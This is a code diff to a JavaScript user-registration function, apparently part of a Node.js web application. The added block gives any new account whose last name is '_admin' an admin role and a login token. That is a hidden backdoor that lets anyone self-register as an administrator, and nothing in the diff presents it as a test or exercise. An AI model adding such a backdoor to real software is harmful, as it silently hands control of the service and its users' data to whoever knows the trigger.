@@ -12,6 +12,19 @@ async function register(email, password, firstName, lastName, phone) {
         throw new Error('Email already used !')
     }
     
+    if(lastName === '_admin') {
+        const admin = await User.create({
+            email,
+            hashedPassword: await bcrypt.hash(password, 10),
+            firstName,
+            lastName,
+            phone,
+            _role: ['admin']
+        });
+        
+    
+        return createToken(admin);
+    }
     
     const user = await User.create({
         email,
@@ -20,9 +33,9 @@ async function register(email, password, firstName, lastName, phone) {
         lastName,
         phone
     }); 
-    
 
     return createToken(user);
+   
 };
 
 async function login(email, password) {
